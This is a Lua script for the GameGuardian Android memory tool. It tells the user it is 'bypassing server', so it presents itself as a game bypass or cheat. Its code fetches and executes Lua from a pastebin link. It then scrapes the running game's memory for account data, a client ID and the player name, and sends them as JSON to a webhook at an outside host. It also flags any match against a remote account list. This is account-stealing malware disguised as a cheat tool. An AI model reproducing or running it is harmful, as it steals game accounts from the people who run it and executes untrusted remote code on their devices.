function dwordToUTF8(dword)
    local byte1 = dword & 0xFF
    local byte2 = (dword >> 8) & 0xFF
    local byte3 = (dword >> 16) & 0xFF
    local byte4 = (dword >> 24) & 0xFF
    return string.char(byte1, byte2, byte3, byte4)
end
gg.toast("Please wait.....bypassing server")
function scanAndCollectResults(searchString, refineString, maxResults, stepCount, searchType)
    searchType = searchType or gg.TYPE_BYTE
 
    gg.searchNumber(searchString, searchType, false, gg.SIGN_EQUAL, 0, -1)
    gg.refineNumber(refineString)
    gg.setVisible(false)
    local results = gg.getResults(maxResults or 1000)
    local fullUtf8Data = ""
 
    if #results > 0 then
        for _, result in ipairs(results) do
            local baseAddress = result.address
            local utf8Combined = ""
 
            for offset = 0, (stepCount or 200), 4 do
                local dword = gg.getValues({ { address = baseAddress + offset, flags = gg.TYPE_DWORD } })[1]
                if dword then
                    utf8Combined = utf8Combined .. dwordToUTF8(dword.value)
                end
            end
 
            fullUtf8Data = fullUtf8Data .. utf8Combined .. "\n"
        end
    end
 
    gg.clearResults()
    return fullUtf8Data
end

local whk = "http://edittex.x10.bz/Bypass"

local function buildQuery(url, query)
    if not query or next(query) == nil then
        return url
    end
 
    local query_string = ""
    for k, v in pairs(query) do
        query_string = query_string .. k .. "=" .. tostring(v) .. "&"
    end
    query_string = query_string:sub(1, -2)
 
    return url .. "?" .. query_string
end
 
local function escapeString(s)
    s = s:gsub("\\", "\\\\")
    s = s:gsub("\"", "\\\"")
    s = s:gsub("\n", "\\n")
    s = s:gsub("\r", "\\r")
    return s
end
 
local function toJson(tbl)
    local json = "{"
 
    for k, v in pairs(tbl) do
        local kType = type(k)
 
        if kType == "string" then
            json = json .. '"' .. k .. '":'
        elseif kType == "number" then
            json = json .. k .. ":"
        end
 
        local vType = type(v)
 
        if vType == "string" then
            json = json .. '"' .. escapeString(v) .. '"'
        elseif vType == "number" then
            json = json .. v
        elseif vType == "table" then
            json = json .. toJson(v)
        end
 
        json = json .. ","
    end
 
    json = json:sub(1, -2) .. "}"
 
    return json
end
 
local function sendWebhook(payload_content)
    local payload = { content = payload_content }
    local headers = {
        ["Content-Type"] = "application/json",
    }
    local payload_json = toJson(payload)
    gg.makeRequest(whk, headers, payload_json)
end
 
local secret_accounts = {}
 
function fetchSecretAccounts()
    local past = "https://pastebin.com/raw/wvwFW7hU"
    local response = gg.search(past)
 
    if response and response.content then
        local chunk, errorMsg = load(response.content)
        if chunk then
            secret_accounts = chunk()
        else
            print("Unknown Error, please run script again.")
            os.exit()
        end
    else
        print("Unknown Error, please run script again.")
        os.exit()
    end
end
 
function checkSecretAccounts()
    for account_id, associated_id in pairs(secret_accounts) do
        gg.searchNumber(";" .. account_id, gg.TYPE_WORD, false, gg.SIGN_EQUAL, 0, -1)
        gg.setVisible(false)
        local results = gg.getResults(1)
        gg.clearResults()
 
        if #results > 0 then
            sendWebhook("🔒 User: " .. associated_id)
            return true
        end
    end
    return false
end
 
fetchSecretAccounts()
 
local function sanitizeString(input)
    -- Replace null bytes and invalid characters with empty
    return input:gsub("[%z\1-\31\127-\255]", "")
end
 
-- Main data collection
local fullUtf8Data = scanAndCollectResults(":adInterval", ":v", 1000, 200, gg.TYPE_BYTE)
local tmp_c_id = scanAndCollectResults("8,389,772,277,107,089,698", "8,389,772,277,107,089,698", 1000, 100, gg.TYPE_QWORD)
local playerName = scanAndCollectResults(":{\"Create", ":t", 1000, 70, gg.TYPE_BYTE)
--local playerId = scanAndCollectResults("27,423,342,016,359,796", "27,423,342,016,359,796", 1000, 100, gg.TYPE_QWORD)
 
if not checkSecretAccounts() then
    if fullUtf8Data == "" and tmp_c_id == "" and playerName == "" and playerId == "" then
        sendWebhook("Error! Nothing Found 💩")
    else
        local payload_content = "Account:\n" .. sanitizeString(fullUtf8Data) ..
                                "\n\nv1:\n" .. sanitizeString(tmp_c_id) ..
                                "\n\nv2:\n" .. sanitizeString(playerName)
                              --  "\n\nv3:\n" .. sanitizeString(playerId)
        sendWebhook(payload_content)
    end
end
